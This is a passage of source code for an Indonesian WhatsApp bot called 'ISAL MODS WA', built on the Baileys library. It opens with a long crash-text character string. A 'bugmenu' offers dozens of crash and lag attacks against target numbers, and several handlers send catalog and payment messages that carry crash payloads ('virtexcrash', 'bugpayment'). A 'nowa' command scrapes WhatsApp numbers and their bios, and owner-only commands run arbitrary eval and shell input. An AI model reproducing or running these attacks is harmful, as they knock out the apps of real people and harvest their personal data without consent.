𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦` }, { quoted: adehvn })
}
break
//=================================================//
case 'ciribocil':
buatmenu = thumb
textmenu = `

*EPEP ADALAH GAME BOCIL ESEMPE JEDAKS JEDUKS*

© ISAL MODS WA
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
//=================================================//
case 'catalog2': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © ISAL MODS WA - XPRO ${nida}`,
"description": ` - © ISAL MODS WA -

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SC BOT PRIVATE ISAL MODS️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ISAL MODS WA`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285724506534@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalog3': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "ISAL MODS WA",
"title": ` © ISAL MODS WA 🔥 ${nida}`,
"description": ` - © ISAL MODS WA -

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SC BOT PRIVATE ISAL MODS️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ISAL MODS WA`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285724506534@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalog4': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "ISAL MODS WA",
"title": ` © ISAL MODS WA 🌒 ${virtexcrash}`,
"description": ` - © ISAL MODS WA -

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SC BOT PRIVATE ISAL MODS️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ISAL MODS WA`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285724506534@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'catalog5': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "ISAL MODS WA",
"title": ` © ISAL MODS WA 👋 ${api}`,
"description": ` - © ISAL MODS WA -

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SC BOT PRIVATE ISAL MODS️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ISAL MODS WA`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285724506534@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'bugpayment':
const jancok = (teks) => {
ranz.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
jancok('KONTOL')
break
//=================================================//
case 'bugfake':
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
buatmenu = thumb
textmenu = `© ISAL MODS WA 🔥 ${virtexcrash}
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
//=================================================//
case 'nowa': {
if (!args[0]) throw `Kirim perintah ${prefix+command} <nomer>`
var noteks = args[0]
if (!noteks.includes('x')) throw 'lah?'
m.reply(mess.wait)
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await ranz.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await ranz.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
//=================================================//
case 'owner':
buatmenu = thumb
textmenu = `

[ SC BOT ISAL MODS 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*OWNER KAMI*
◎ wa.me/6285724506534
◎ wa.me/6285700429438

© ISAL MODS WA
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'hallo': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Hallo Apa Ada Yang Bisa Saya Bantu 🙏`,
"description": ` - © ISAL MODS WA -

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIH LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© ISAL MODS WA`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285724506534@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: m })
ranz.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'menu':
case 'list':
case 'help':
buatmenu = thumb
textmenu = `

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Selamat datang di bot kami 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*MENU*
┏━━⊱ 
┣❏➥ botmenu
┣❏➥ bugmenu
┣❏➥ infobot
┣❏➥ hallo
┣❏➥ pemersatu
┗━━⊱

© ISAL MODS WA
▬▭▬▭▬▭▬▭▬▭▬▭▬
*NOTE*
🌷
contact me wa.me/6285724506534
▬▭▬▭▬▭▬▭▬▭▬▭▬
Note : Gunakan dengan bijak!
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'pemersatu':
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
buatmenu = thumb
textmenu = `

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Selamat datang di bot kami 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*ASUPANMENU*
┏━━⊱ 
┣❏➥ bokep
┗━━⊱

INGAT JANGAN KEBANYAKAN NGOCOK!!

© ISAL MODS WA
▬▭▬▭▬▭▬▭▬▭▬▭▬
*NOTE*
🌷
contact me wa.me/6285724506534
▬▭▬▭▬▭▬▭▬▭▬▭▬
Note : Gunakan dengan bijak!
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'botmenu':
buatmenu = thumb
textmenu = `

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Selamat datang di bot kami 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*GRUPMENU*
┏━━⊱ 
┣❏➥ linkgroup
┣❏➥ ephemeral [option]
┣❏➥ setppgc [image]
┣❏➥ setname [text]
┣❏➥ setdesc [text]
┣❏➥ group [option]
┣❏➥ editinfo [option]
┣❏➥ add @user
┣❏➥ kick @user
┣❏➥ hidetag [text]
┣❏➥ tagall [text]
┣❏➥ antilink [on/off]
┣❏➥ mute [on/off]
┣❏➥ promote @user
┣❏➥ demote @user
┣❏➥ vote [text]
┣❏➥ devote
┣❏➥ upvote
┣❏➥ cekvote
┣❏➥ hapusvote
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*SEARCHMENU*
┏━━⊱ 
┣❏➥ play [query]
┣❏➥ yts [query]
┣❏➥ google [query]
┣❏➥ gimage [query]
┣❏➥ pinterest [query]
┣❏➥ wallpaper [query]
┣❏➥ wikimedia [query]
┣❏➥ ytsearch [query]
┣❏➥ ringtone [query]
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*MAKERMENU*
┏━━⊱ 
┣❏➥ attp [text]
┣❏➥ ttp [text]
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*FUNMENU*
┏━━⊱ 
┣❏➥ halah
┣❏➥ hilih
┣❏➥ huluh
┣❏➥ heleh
┣❏➥ holoh
┣❏➥ jadian
┣❏➥ jodohku
┣❏➥ delttt
┣❏➥ tictactoe
┣❏➥ family100
┣❏➥ tebak [option]
┣❏➥ math [mode]
┣❏➥ suitpvp [@tag]
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*TOOLSMENU*
┏━━⊱ 
┣❏➥ toimage
┣❏➥ removebg
┣❏➥ sticker
┣❏➥ emojimix
┣❏➥ tovideo
┣❏➥ togif
┣❏➥ tourl
┣❏➥ tovn
┣❏➥ ytmp3
┣❏➥ ytmp4
┣❏➥ tomp3
┣❏➥ toaudio
┣❏➥ ebinary
┣❏➥ dbinary
┣❏➥ styletext
┣❏➥ smeme
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*MAINMENU*
┏━━⊱ 
┣❏➥ ping
┣❏➥ owner
┣❏➥ menu / help / ?
┣❏➥ delete
┣❏➥ infochat
┣❏➥ quoted
┣❏➥ ciribocil
┣❏➥ listpc
┣❏➥ listgc
┣❏➥ listonline
┣❏➥ speedtest
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*DATABASEMENU*
┏━━⊱ 
┣❏➥ setcmd
┣❏➥ listcmd
┣❏➥ delcmd
┣❏➥ lockcmd
┣❏➥ addmsg
┣❏➥ listmsg
┣❏➥ getmsg
┣❏➥ delmsg
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*ANONYMOUSMENU*
┏━━⊱ 
┣❏➥ anonymous
┣❏➥ start
┣❏➥ next
┣❏➥ keluar
┗━━⊱
▬▭▬▭▬▭▬▭▬▭▬▭▬
*OWNERMENU*
┏━━⊱ 
┣❏➥ react [emoji]
┣❏➥ chat [option]
┣❏➥ join [link]
┣❏➥ leave
┣❏➥ block @user
┣❏➥ unblock @user
┣❏➥ bcgroup [text]
┣❏➥ bcall [text]
┣❏➥ setppbot [image]
┣❏➥ setexif
┣❏➥ nowa <nomer>
┗━━⊱

© ISAL MODS WA
▬▭▬▭▬▭▬▭▬▭▬▭▬
*NOTE*
🌷
contact me wa.me/6285724506534
▬▭▬▭▬▭▬▭▬▭▬▭▬
Note : Gunakan dengan bijak!
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'infobot':
buatmenu = thumb
textmenu = `

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Selamat datang di bot kami 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*INFOBOT*

◎ Name : ISAL MODS WA
◎ Description : WhatsApp Bot Using Lib Baileys
◎ Logo : https://node-js-sample.herokuapp.com/node.png
◎ Keywords : Multi-Device
◎ Owner : 6285724506534
◎ Premium : 6285700429438
◎ Author : WhatsApp Bot
◎ YouTube : https://youtube.com/channel/UC7CtK1YjIz4jg_A7zIzSxzg

© ISAL MODS WA
▬▭▬▭▬▭▬▭▬▭▬▭▬
*NOTE*
🌷
contact me wa.me/6285724506534
▬▭▬▭▬▭▬▭▬▭▬▭▬
Note : Gunakan dengan bijak!
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'bugmenu':
buatmenu = thumb
textmenu = `

◎ Owner : ISAL MODS WA
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Selamat datang di bot kami 👋 ]
▬▭▬▭▬▭▬▭▬▭▬▭▬
*BUGMENU*
┏━━⊱ 
┣❏➥ penjara
┣❏➥ pe
┣❏➥ bugreac
┣❏➥ dok
┣❏➥ bukadong
┣❏➥ isaltag
┣❏➥ colidek
┣❏➥ darkness
┣❏➥ crashar
┣❏➥ virtexlag
┣❏➥ bugmaster
┣❏➥ sayangcrash
┣❏➥ bugdoc
┣❏➥ bugdoc2
┣❏➥ catalog
┣❏➥ catalog2
┣❏➥ catalog3
┣❏➥ catalog4
┣❏➥ catalog5
┣❏➥ bugsex
┣❏➥ bugisal
┣❏➥ bugvn
┣❏➥ bugepep
┣❏➥ buglokasi
┣❏➥ bugweb
┣❏➥ revengetobastard
┣❏➥ bugsticker
┣❏➥ bugtroli
┣❏➥ bugtroli2
┣❏➥ bugbokep
┣❏➥ bugbokep2
┣❏➥ bugkontak
┣❏➥ bugkontak2
┣❏➥ bugpc
┣❏➥ virdokcrash
┣❏➥ bugstik
┣❏➥ virkonpending
┣❏➥ poll
┣❏➥ bugesempeh
┣❏➥ buginvite
┣❏➥ sistem
┣❏➥ bugpdf
┣❏➥ bugfake
┣❏➥ buglive
┣❏➥ buggc
┣❏➥ legcaptionx
┣❏➥ bugpayment
┣❏➥ bugtroli3 [Jumlah]
┣❏➥ bugtroli4 [Jumlah]
┣❏➥ gascrashar [Nomer]
┣❏➥ gasbro [Nomer]
┣❏➥ gasbtt [Nomer]
┣❏➥ sendreaksi [Nomer]
┣❏➥ stickercrash [Nomer]
┣❏➥ vncrash [Nomer]
┣❏➥ santed30menit [Nomer]
┣❏➥ santed1jam [Nomer]
┣❏➥ santed24jam [Nomer]
┣❏➥ jadivirtex [Text]
┣❏➥ jadivirtex2 [Text]
┗━━⊱

© ISAL MODS WA
▬▭▬▭▬▭▬▭▬▭▬▭▬
*NOTE*
🌷
contact me wa.me/6285724506534
▬▭▬▭▬▭▬▭▬▭▬▭▬
Note : Gunakan dengan bijak!
️`
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
case 'sistem':
m.reply(sistem)
break
case 'legcaptionx':
buatmenu = fs.readFileSync('lib/sw.jpg')
textmenu = txtsw
ranz.sendMessage(m.chat, {image: buatmenu, caption: textmenu}, { quoted : m })
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    ranz.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
